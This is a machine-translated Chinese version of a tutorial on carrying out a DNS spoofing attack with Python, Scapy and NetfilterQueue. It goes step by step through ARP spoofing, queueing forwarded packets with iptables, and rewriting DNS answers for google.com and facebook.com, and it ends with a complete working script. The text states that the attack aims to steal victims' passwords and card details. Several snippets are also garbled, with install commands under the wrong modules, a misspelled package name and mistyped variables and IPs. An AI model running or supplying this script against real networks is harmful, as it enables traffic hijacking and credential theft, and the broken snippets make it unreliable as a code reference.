# 如何用 Python 中的 Scapy 进行 DNS 恶搞攻击？

> 原文:[https://www . geeksforgeeks . org/如何制作 DNS-欺骗-攻击-使用 python 中的 scapy/](https://www.geeksforgeeks.org/how-to-make-a-dns-spoof-attack-using-scapy-in-python/)

在本文中，我们将讨论如何使用 Python 中的 Scapy 进行 DNS 欺骗攻击。在开始之前，我们需要知道几点:

*   **DNS server:** The domain name system provides a method to match human-readable domain names to IP addresses. For example, when we search for google.com, the browser queries the [domain name system](https://www.geeksforgeeks.org/domain-name-system-dns-in-application-layer/) server for the domain name system to return the IP address of Google server (172.217.166.110).
*   **DNS spoof:** DNS spoof is a computer network attack, which forces the target to navigate to the fake page by replacing the IP address sent by the DNS server. This target doesn't know this is a fake page. The motive of the attack is to steal the target's data (user name, credit card details, password, etc.).

**所需模块:**

*   **Netfilter queue:** [Netfilter queue](https://pypi.org/project/NetfilterQueue/) is a Python library, which provides access to data packets matched by iptables rules in Linux. Such matched packets can be accepted, discarded, changed or marked. Run the following command to install:

```
pip3 install scapy
```

*   **Scapy:** [Scapy](https://scapy.readthedocs.io/en/latest/) is a Python package used to manipulate computer network packets. It can complete tasks such as scanning, tracking routing, probing, unit testing and network discovery. Run the following command to install:

```
pip3 install netfiltdrqueue
```

**采用的方法:**

*   在目标网络中实施 ARP 欺骗，以便所有数据包都可以通过您的设备进行路由。
*   创建一个 Iptable 链规则，将通过设备路由的数据包推送到网络过滤队列。
*   下一步是用我们的脚本处理数据包(脚本解释如下)。
*   处理后的数据包将被发送给受害者。
*   那么受害者将从域名系统响应中收到一个假的 IP 地址。
*   当您希望终止脚本时，请删除我们在第二步中创建的 Iptable 规则。

**我们来看看分步实现 DNS 欺骗的命令和功能。**

**步骤 1:** 导入模块。

```
from scapy.all import *

import os
import logging as log
from scapy.all import IP, DNSRR, DNSQR, UDP, DNS
from netfilterqueue import NetfilterQueue
```

**第 2 步:**将此规则插入到 IP 表中，这样数据包将被重定向到 NetfilterQuque。然后我们可以使用 scapy 包来修改队列中的数据包。队列号可以是您选择的任何数字。

```
os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num  1")
```

**步骤 3:** 创建网络过滤队列对象。

```
queue = NetfilterQueue()
```

**步骤 4:** 将队列对象绑定到队列号和回调函数。然后在实现回调函数后启动队列。

```
queue.bind(queueNum,callback)
queue.run()
```

**第五步:**创建我们需要欺骗的主机名的 DNS 记录字典。您可以根据自己的选择添加更多的域名映射(所有映射的 IP 地址不必相同)。

```
hostsDict = {
    "google.com"  : "192.168..48.243",
    "facebook.com" : "192.168.48.243"
}
```

**第 6 步:**当新的数据包进入队列时，将调用回调函数。数据包将作为参数传递给回调函数。

```
def callBack(packet):
```

**步骤 7:** 接下来，将 NetfilterQueue 数据包转换为 scapy 数据包，以处理该数据包。

```
scapyPacket = IP(packet.get_payload())
```

**步骤 8:** 检查数据包中是否有域名系统资源记录。如果它有 DNSRR，我们将修改数据包，否则不会对数据包进行任何更改。

```
if scapyPacket.haslayer(DNSRR):
```

**步骤 9:** 从数据包中获取域名系统查询名称。查询名称是受害者发送给 DNS 服务器的主机名。

```
queryName = scapyPacket[DNSQR].qname
```

**步骤 10:** 如果我们的目标主机字典中的查询名称，我们用主机字典中的 IP 地址修改 DNS 发送的 IP 地址。

```
if queryName in hostDict:
    sacpyPacket[DNS].an = DNSRR(rrname = queryName, rdata = hostDict[queryName])
```

**步骤 11:** 修改数据包计数为 1，因为我们被发送给受害者一个单一的 DNSRR。

```
scapyPacket[DNS].ancount = 1
```

**步骤 12:** 可以使用校验和和其他信息检测数据包损坏，因此我们删除它们，并使用 scapy 生成一个新条目。

```
del scapyPacket[IP].len
del scapyPacket[IP].chksum
del scapyPacket[UDP].len
del scapyPacket[UDP].chksum
```

**步骤 13:** 将修改后的 scapy 数据包有效负载设置为 NetfilterQueue 数据包。

```
packet.set_payload(bytes(scapyPacket))
```

**第 14 步:**数据包准备发送给受害者。

```
packet.accept()
```

**步骤 15:** 终止脚本时，删除创建的 IP 表规则。

```
os.system("sudo iptables -D FORWARD -j NFQUEUE --queue-num 1")
```

**下面是完整实现:**

## 蟒 3

```
import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue

class DnsSnoof:
    def __init__(self, hostDict, queueNum):
        self.hostDict = hostDict
        self.queueNum = queueNum
        self.queue = NetfilterQueue()

    def __call__(self):
        log.info("Snoofing....")
        os.system(
            f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
        self.queue.bind(self.queueNum, self.callBack)
        try:
            self.queue.run()
        except KeyboardInterrupt:
            os.system(
                f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            log.info("[!] iptable rule flushed")

    def callBack(self, packet):
        scapyPacket = IP(packet.get_payload())
        if scapyPacket.haslayer(DNSRR):
            try:
                log.info(f'[original] { scapyPacket[DNSRR].summary()}')
                queryName = scapyPacket[DNSQR].qname
                if queryName in self.hostDict:
                    scapyPacket[DNS].an = DNSRR(
                        rrname=queryName, rdata=self.hostDict[queryName])
                    scapyPacket[DNS].ancount = 1
                    del scapyPacket[IP].len
                    del scapyPacket[IP].chksum
                    del scapyPacket[UDP].len
                    del scapyPacket[UDP].chksum
                    log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
                else:
                    log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
            except IndexError as error:
                log.error(error)
            packet.set_payload(bytes(scapyPacket))
        return packet.accept()

if __name__ == '__main__':
    try:
        hostDict = {
            b"google.com.": "192.168.1.100",
            b"facebook.com.": "192.168.1.100"
        }
        queueNum = 1
        log.basicConfig(format='%(asctime)s - %(message)s', 
                        level = log.INFO)
        snoof = DnsSnoof(hostDict, queueNum)
        snoof()
    except OSError as error:
        log.error(error)
```